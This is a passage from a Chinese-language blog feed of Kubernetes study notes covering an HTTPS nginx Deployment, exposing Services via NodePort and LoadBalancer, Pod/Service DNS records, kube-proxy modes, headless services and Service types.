class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">my-nginx</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">my-nginx</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">my-nginx</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">secret-volume</span><br>        <span class="hljs-attr">secret:</span><br>          <span class="hljs-attr">secretName:</span> <span class="hljs-string">nginxsecret</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">configmap-volume</span><br>        <span class="hljs-attr">configMap:</span><br>          <span class="hljs-attr">name:</span> <span class="hljs-string">nginxconfigmap</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">nginxhttps</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">bprashanth/nginxhttps:1.0</span><br>        <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">443</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">80</span><br>        <span class="hljs-attr">volumeMounts:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/etc/nginx/ssl</span><br>          <span class="hljs-attr">name:</span> <span class="hljs-string">secret-volume</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/etc/nginx/conf.d</span><br>          <span class="hljs-attr">name:</span> <span class="hljs-string">configmap-volume</span><br><br><br></code></pre></td></tr></table></figure><p>关于 nginx-secure-app 清单，值得注意的几点如下：</p><p>它在相同的文件中包含了 Deployment 和 Service 的规约<br>nginx 服务器 处理 80 端口上的 HTTP 流量，以及 443 端口上的 HTTPS 流量，Nginx Service 暴露了这两个端口。<br>每个容器访问挂载在 /etc/nginx/ssl 卷上的秘钥。这需要在 Nginx 服务器启动之前安装好。<br><font color="red" size="2">以下命令值得学习： </font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl delete deployments,svc my-nginx; kubectl create -f ./nginx-secure-app.yaml<br></code></pre></td></tr></table></figure><h1 id="暴露Service"><a href="#暴露Service" class="headerlink" title="暴露Service"></a>暴露Service</h1><h4 id="nodePort-方式"><a href="#nodePort-方式" class="headerlink" title="nodePort 方式"></a>nodePort 方式</h4><p>对我们应用的某些部分，可能希望将 Service 暴露在一个外部 IP 地址上。 Kubernetes 支持两种实现方式：NodePort 和 LoadBalancer。 在上一段创建的 Service 使用了 NodePort，因此 Nginx https 副本已经就绪， 如果使用一个公网 IP，能够处理 Internet 上的流量。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>kubectl get svc my-nginx -o yaml | grep nodePort -C 5<br></code></pre></td></tr></table></figure><p><a href="/%E4%BD%BF%E7%94%A8Service%E9%93%BE%E6%8E%A5%E5%88%B0%E5%BA%94%E7%94%A8/20211109035833187.png" class="gallery-item"><img src="/2021/11/09/%E4%BD%BF%E7%94%A8Service%E9%93%BE%E6%8E%A5%E5%88%B0%E5%BA%94%E7%94%A8/20211109035833187.png"></a></p><h4 id="LoadBalancer-方式"><a href="#LoadBalancer-方式" class="headerlink" title="LoadBalancer 方式"></a>LoadBalancer 方式</h4><p>让我们重新创建一个 Service，使用一个云负载均衡器，只需要将 <code>my-nginx</code> Service 的 <code>Type</code> 由 <code>NodePort</code> 改成 <code>LoadBalancer</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl edit svc my-nginx<br>kubectl get svc my-nginx<br><br>NAME       TYPE           CLUSTER-IP     EXTERNAL-IP        PORT(S)               AGE<br>my-nginx   LoadBalancer   10.0.162.149   xx.xxx.xxx.xxx     8080:30163/TCP        21s<br><br>curl https://&lt;EXTERNAL-IP&gt; -k<br>...<br>&lt;title&gt;Welcome to nginx!&lt;/title&gt;<br></code></pre></td></tr></table></figure><p>在 EXTERNAL-IP 列指定的 IP 地址是在公网上可用的。CLUSTER-IP 只在集群/私有云网络中可用。</p><p>注意，在 AWS 上类型 LoadBalancer 创建一个 ELB，它使用主机名（比较长），而不是 IP。 它太长以至于不能适配标准 kubectl get svc 的输出，事实上需要通过执行 kubectl describe service my-nginx 命令来查看它。 可以看到类似如下内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl describe service my-nginx<br><br>LoadBalancer Ingress:   a320587ffd19711e5a37606cf4a74574-1142138393.us-east-1.elb.amazonaws.com<br><br></code></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> k8s </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pod 与 Service 的DNS</title>
      <link href="/2021/11/08/Pod%E4%B8%8EService%E7%9A%84DNS/"/>
      <url>/2021/11/08/Pod%E4%B8%8EService%E7%9A%84DNS/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h1 id="Service-的名字空间"><a href="#Service-的名字空间" class="headerlink" title="Service 的名字空间"></a>Service 的名字空间<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">#例如，假定名字空间 test 中存在一个 Pod，prod 名字空间中存在一个服务 data。<br><br># Pod 查询 data 时没有返回结果，因为使用的是 Pod 的名字空间 test。<br># Pod 查询 data.prod 时则会返回预期的结果，因为查询中指定了名字空间。<br></code></pre></td></tr></table></figure><h1 id="Pods"><a href="#Pods" class="headerlink" title="Pods"></a>Pods</h1><h3 id="A／AAAA记录"><a href="#A／AAAA记录" class="headerlink" title="Ａ／ＡＡＡＡ记录"></a>Ａ／ＡＡＡＡ记录</h3><h3 id="Pod-的hostname-和-subdomain字段"><a href="#Pod-的hostname-和-subdomain字段" class="headerlink" title="Pod 的hostname 和 subdomain字段"></a>Pod 的hostname 和 subdomain字段</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">default-subdomain</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">busybox</span><br>  <span class="hljs-attr">clusterIP:</span> <span class="hljs-string">None</span><br>  <span class="hljs-attr">ports:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">foo</span> <span class="hljs-comment"># 实际上不需要指定端口号</span><br>    <span class="hljs-attr">port:</span> <span class="hljs-number">1234</span><br>    <span class="hljs-attr">targetPort:</span> <span class="hljs-number">1234</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">busybox1</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">busybox</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">hostname:</span> <span class="hljs-string">busybox-1</span><br>  <span class="hljs-attr">subdomain:</span> <span class="hljs-string">default-subdomain</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">image:</span> <span class="hljs-string">busybox:1.28</span><br>    <span class="hljs-attr">command:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">sleep</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;3600&quot;</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">busybox</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">busybox2</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">busybox</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">hostname:</span> <span class="hljs-string">busybox-2</span><br>  <span class="hljs-attr">subdomain:</span> <span class="hljs-string">default-subdomain</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">image:</span> <span class="hljs-string">busybox:1.28</span><br>    <span class="hljs-attr">command:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">sleep</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;3600&quot;</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">busybox</span><br><br><br></code></pre></td></tr></table></figure><p><font color="green" size="3">DNS 会为此名字提供一个 A 记录或 AAAA 记录，指向该 Pod 的 IP。 “busybox1” 和 “busybox2” 这两个 Pod 分别具有它们自己的 A 或 AAAA 记录。</font></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> K8S </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kubernetes_Service</title>
      <link href="/2021/11/08/service/"/>
      <url>/2021/11/08/service/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h1 id="定义Service"><a href="#定义Service" class="headerlink" title="定义Service"></a>定义Service<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">my-service</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">MyApp</span><br>  <span class="hljs-attr">ports:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span><br>      <span class="hljs-attr">port:</span> <span class="hljs-number">80</span><br>      <span class="hljs-attr">targetPort:</span> <span class="hljs-number">9376</span><br>      <br></code></pre></td></tr></table></figure><h2 id="没有选择符的Service"><a href="#没有选择符的Service" class="headerlink" title="没有选择符的Service"></a>没有选择符的Service</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Endpoints</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">my-service</span><br><span class="hljs-attr">subsets:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">addresses:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">ip:</span> <span class="hljs-number">192.0</span><span class="hljs-number">.2</span><span class="hljs-number">.42</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">9376</span><br><br></code></pre></td></tr></table></figure><p>Endpoints 对象的名称是合法的DNS子域名。 my-service  是合法的DNS子域名。</p><h1 id="虚拟-IP-和-Service-代理"><a href="#虚拟-IP-和-Service-代理" class="headerlink" title="虚拟 IP 和 Service 代理"></a>虚拟 IP 和 Service 代理</h1><h2 id="userspace-代理模式"><a href="#userspace-代理模式" class="headerlink" title="userspace 代理模式"></a>userspace 代理模式</h2><p>这种模式，kube-proxy 会监视 Kubernetes 控制平面对 Service 对象和 Endpoints 对象的添加和移除操作。 对每个 Service，它会在本地 Node 上打开一个端口（随机选择）。 任何连接到“代理端口”的请求，都会被代理到 Service 的后端 Pods 中的某个上面（如 Endpoints 所报告的一样）。 使用哪个后端 Pod，是 kube-proxy 基于 SessionAffinity 来确定的。</p><p>最后，它配置 iptables 规则，捕获到达该 Service 的 clusterIP（是虚拟 IP） 和 Port 的请求，并重定向到代理端口，代理端口再代理请求到后端Pod。<br>默认情况下，用户空间模式下的 kube-proxy 通过轮转算法选择后端。</p><p><a href="/service/20211108120823314.png" class="gallery-item"><img src="/2021/11/08/service/20211108120823314.png"></a></p><h2 id="iptables-代理模式"><a href="#iptables-代理模式" class="headerlink" title="iptables 代理模式"></a>iptables 代理模式</h2><p>这种模式，kube-proxy 会监视 Kubernetes 控制节点对 Service 对象和 Endpoints 对象的添加和移除。 对每个 Service，它会配置 iptables 规则，从而捕获到达该 Service 的 clusterIP 和端口的请求，进而将请求重定向到 Service 的一组后端中的某个 Pod 上面。 对于每个 Endpoints 对象，它也会配置 iptables 规则，这个规则会选择一个后端组合。</p><p>默认的策略是，kube-proxy 在 iptables 模式下随机选择一个后端。</p><p>使用 iptables 处理流量具有较低的系统开销，因为流量由 Linux netfilter 处理， 而无需在用户空间和内核空间之间切换。 这种方法也可能更可靠。</p><p>如果 kube-proxy 在 iptables 模式下运行，并且所选的第一个 Pod 没有响应， 则连接失败。 这与用户空间模式不同：在这种情况下，kube-proxy 将检测到与第一个 Pod 的连接已失败， 并会自动使用其他后端 Pod 重试。</p><p>你可以使用 Pod 就绪探测器 验证后端 Pod 可以正常工作，以便 iptables 模式下的 kube-proxy 仅看到测试正常的后端。 这样做意味着你避免将流量通过 kube-proxy 发送到已知已失败的 Pod。</p><p><a href="/service/20211108025250483.png" class="gallery-item"><img src="/2021/11/08/service/20211108025250483.png"></a></p><h2 id="IPVS-代理模式"><a href="#IPVS-代理模式" class="headerlink" title="IPVS 代理模式"></a>IPVS 代理模式</h2><p>FEATURE STATE: Kubernetes v1.11 [stable]<br>在 ipvs 模式下，kube-proxy 监视 Kubernetes 服务和端点，调用 netlink 接口相应地创建 IPVS 规则， 并定期将 IPVS 规则与 Kubernetes 服务和端点同步。 该控制循环可确保IPVS 状态与所需状态匹配。访问服务时，IPVS 将流量定向到后端Pod之一。</p><p>IPVS代理模式基于类似于 iptables 模式的 netfilter 挂钩函数， 但是使用哈希表作为基础数据结构，并且在内核空间中工作。 这意味着，与 iptables 模式下的 kube-proxy 相比，IPVS 模式下的 kube-proxy 重定向通信的延迟要短，并且在同步代理规则时具有更好的性能。 与其他代理模式相比，IPVS 模式还支持更高的网络流量吞吐量。</p><p>IPVS 提供了更多选项来平衡后端 Pod 的流量。 这些是：</p><ol><li>rr：轮替（Round-Robin）</li><li>lc：最少链接（Least Connection），即打开链接数量最少者优先</li><li>dh：目标地址哈希（Destination Hashing）</li><li>sh：源地址哈希（Source Hashing）</li><li>sed：最短预期延迟（Shortest Expected Delay）</li><li>nq：从不排队（Never Queue）</li></ol><p><a href="/service/20211108025354880.png" class="gallery-item"><img src="/2021/11/08/service/20211108025354880.png"></a></p><h1 id="多端口Service"><a href="#多端口Service" class="headerlink" title="多端口Service"></a>多端口Service</h1><p>对于某些服务，你需要公开多个端口。 Kubernetes 允许你在 Service 对象上配置多个端口定义。 为服务使用多个端口时，必须提供所有端口名称，以使它们无歧义。 例如：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">my-service</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">MyApp</span><br>  <span class="hljs-attr">ports:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">http</span><br>      <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span><br>      <span class="hljs-attr">port:</span> <span class="hljs-number">80</span><br>      <span class="hljs-attr">targetPort:</span> <span class="hljs-number">9376</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">https</span><br>      <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span><br>      <span class="hljs-attr">port:</span> <span class="hljs-number">443</span><br>      <span class="hljs-attr">targetPort:</span> <span class="hljs-number">9377</span><br><br><span class="hljs-comment"># 名字不能包括“_” ，下横杠</span><br></code></pre></td></tr></table></figure><h1 id="选择自己的IP地址"><a href="#选择自己的IP地址" class="headerlink" title="选择自己的IP地址"></a>选择自己的IP地址</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">spec.clusterIP</span> <span class="hljs-string">=</span> <span class="hljs-number">10.244</span><span class="hljs-number">.1</span><span class="hljs-number">.240</span><br><br></code></pre></td></tr></table></figure><h5 id="需求场景"><a href="#需求场景" class="headerlink" title="需求场景:"></a>需求场景:</h5><p>对于已经存在的DNS解析应用服务，或者遗留系统中已经配置了一个固定的IP地址很难重新配置。 那么可以采用指定clusterIP的方式进行指定。</p><h5 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h5><ol><li> IP 地址必须合法</li><li> 个 IP 地址在 service-cluster-ip-range CIDR 范围内</li></ol><h1 id="流量策略"><a href="#流量策略" class="headerlink" title="流量策略"></a>流量策略</h1><p>你可以通过设置spec.externalTrafficPolicy 字段来控制来自于外部的流量是如何路由的</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># 字段设为 Cluster 会将外部流量路由到所有就绪的端点</span><br><span class="hljs-string">spec.externalTrafficPolicy</span> <span class="hljs-string">=</span> <span class="hljs-string">Cluser</span><br><span class="hljs-comment"># 设为 Local 会只路由到当前节点上就绪的端点。</span><br><span class="hljs-string">spec.externalTrafficPolicy</span> <span class="hljs-string">=</span> <span class="hljs-string">Local</span><br><span class="hljs-comment"># 如果流量策略设置为 Local，而且当前节点上没有就绪的端点，kube-proxy 不会转发请求相关服务的任何流量。</span><br><br><br></code></pre></td></tr></table></figure><h1 id="服务发现"><a href="#服务发现" class="headerlink" title="服务发现"></a>服务发现</h1><p>Kubernetes 支持两种基本的服务发现模式 —— 环境变量和 DNS。</p><h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">REDIS_MASTER_SERVICE_HOST=10.0.0.11</span><br><span class="hljs-string">REDIS_MASTER_SERVICE_PORT=6379</span><br><span class="hljs-string">REDIS_MASTER_PORT=tcp://10.0.0.11:6379</span><br><span class="hljs-string">REDIS_MASTER_PORT_6379_TCP=tcp://10.0.0.11:6379</span><br><span class="hljs-string">REDIS_MASTER_PORT_6379_TCP_PROTO=tcp</span><br><span class="hljs-string">REDIS_MASTER_PORT_6379_TCP_PORT=6379</span><br><span class="hljs-string">REDIS_MASTER_PORT_6379_TCP_ADDR=10.0.0.11</span><br><br><span class="hljs-comment">## 说明：当你具有需要访问服务的 Pod 时，并且你正在使用环境变量方法将端口和集群 IP 发布到客户端 Pod 时，必须在客户端 Pod 出现 之前 创建服务。 否则，这些客户端 Pod 将不会设定其环境变量。如果仅使用 DNS 查找服务的集群 IP，则无需担心此设定问题。</span><br><br></code></pre></td></tr></table></figure><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>例如，如果在命名空间<font color="gray" size="5"> my-ns </font>中有一个名为<font color="gray" size="5"> my-service</font> 的服务， 则控制平面和DNS 服务共同为<font color="gray" size="5"> my-service.my-ns </font> 创建DNS记录。</p><p>Kubernetes 还支持命名端口的 DNS SRV（服务）记录。 如果 my-service.my-ns 服务具有名为 http　的端口，且协议设置为 TCP， 则可以对 <font color="gray" size="5">_http._tcp.my-service.my-ns</font> 执行 DNS SRV 查询查询以发现该端口号, “http” 以及 IP 地址。</p><p>Kubernetes DNS 服务器是唯一的一种能够访问 ExternalName 类型的 Service 的方式。 更多关于 ExternalName 信息可以查看 DNS Pod</p><h1 id="无头服务-【Headless-Services】"><a href="#无头服务-【Headless-Services】" class="headerlink" title="无头服务 【Headless Services】"></a>无头服务 【Headless Services】</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">spec.clusterIP</span> <span class="hljs-string">=</span> <span class="hljs-string">None</span><br></code></pre></td></tr></table></figure><h3 id="无头服务测试："><a href="#无头服务测试：" class="headerlink" title="无头服务测试："></a>无头服务测试：</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">myapp-headless</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br>  <span class="hljs-attr">clusterIP:</span> <span class="hljs-string">&quot;None&quot;</span><br>  <span class="hljs-attr">ports:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span><br>      <span class="hljs-attr">port:</span> <span class="hljs-number">80</span><br>      <span class="hljs-attr">targetPort:</span> <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><h3 id="验证dns方式负载的headless-Services"><a href="#验证dns方式负载的headless-Services" class="headerlink" title="验证dns方式负载的headless Services."></a>验证dns方式负载的headless Services.</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"> dig -t A myapp-headless.default.svc.cluster.local. @172.16.166.222<br><span class="hljs-meta">#</span><span class="bash"> 172.16.166.222 是coredns pod 的IP address .</span><br><span class="hljs-meta">#</span><span class="bash"> myapp-headless 是headless app的name</span><br><br></code></pre></td></tr></table></figure><p><a href="/service/20211110054907153.png" class="gallery-item"><img src="/2021/11/08/service/20211110054907153.png"></a></p><h5 id="带选择算符的服务-【ClusterIP-NodePort-LoadBalancer-ExternalName】"><a href="#带选择算符的服务-【ClusterIP-NodePort-LoadBalancer-ExternalName】" class="headerlink" title="带选择算符的服务 【ClusterIP , NodePort , LoadBalancer, ExternalName】"></a>带选择算符的服务 【ClusterIP , NodePort , LoadBalancer, ExternalName】</h5><p>对定义了选择算符的无头服务，Endpoint 控制器在 API 中创建了 Endpoints 记录， 并且修改 DNS 配置返回 A 记录（IP 地址），通过这个地址直接到达 Service 的后端 Pod 上。</p><h5 id="无选择算符的服务"><a href="#无选择算符的服务" class="headerlink" title="无选择算符的服务"></a>无选择算符的服务</h5><p>然而 DNS 系统会查找和配置</p><h1 id="发布服务（服务类型"><a href="#发布服务（服务类型" class="headerlink" title="发布服务（服务类型)"></a>发布服务（服务类型)</h1><p>对一些应用的某些部分（如前端），可能希望将其暴露给 Kubernetes 集群外部 的 IP 地址。</p><h4 id="Kubernetes-ServiceTypes-允许指定你所需要的-Service-类型，默认是-ClusterIP。"><a href="#Kubernetes-ServiceTypes-允许指定你所需要的-Service-类型，默认是-ClusterIP。" class="headerlink" title="Kubernetes ServiceTypes 允许指定你所需要的 Service 类型，默认是 ClusterIP。"></a>Kubernetes ServiceTypes 允许指定你所需要的 Service 类型，默认是 ClusterIP。</h4><p>Type 的取值以及行为如下：</p><ol><li><p>ClusterIP：通过集群的内部 IP 暴露服务，选择该值时服务只能够在集群内部访问。 这也是默认的 ServiceType。</p></li><li><p>NodePort：通过每个节点上的 IP 和静态端口（NodePort）暴露服务。 NodePort 服务会路由到自动创建的 ClusterIP 服务。 通过请求 &lt;节点 IP&gt;:&lt;节点端口&gt;，你可以从集群的外部访问一个 NodePort 服务。</p></li><li><p>LoadBalancer：使用云提供商的负载均衡器向外部暴露服务。 外部负载均衡器可以将流量路由到自动创建的 NodePort 服务和 ClusterIP 服务上。</p></li><li><p>ExternalName：通过返回 CNAME 和对应值，可以将服务映射到 externalName 字段的内容（例如，foo.bar.example.com）。 无需创建任何类型代理。</p></li></ol><p>说明： 你需要使用 kube-dns 1.7 及以上版本或者 CoreDNS 0.0.8 及以上版本才能使用 ExternalName 类型。<br>你也可以使用 Ingress 来暴露自己的服务。 Ingress 不是一种服务类型，但它充当集群的入口点。 它可以将路由规则整合到一个资源中，因为它可以在同一IP地址下公开多个服务。</p><h4 id="NodePort-类型"><a href="#NodePort-类型" class="headerlink" title="NodePort 类型"></a>NodePort 类型</h4><p>如果你将 type 字段设置为 NodePort，则 Kubernetes 控制平面将在 –service-node-port-range 标志指定的范围内分配端口（默认值：<font color="red" size="4">30000-32767</font>）。 每个节点将那个端口（每个节点上的相同端口号）代理到你的服务中。 你的服务在其</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">.spec.ports[*].nodePort</span> <span class="hljs-comment"># 字段中要求分配的端口。</span><br></code></pre></td></tr></table></figure><p>如果你想指定特定的 IP 代理端口，则可以设置 kube-proxy 中的 –nodeport-addresses 参数 或者将kube-proxy 配置文件 中的等效 nodePortAddresses 字段设置为特定的 IP 块。 该标志采用逗号分隔的 IP 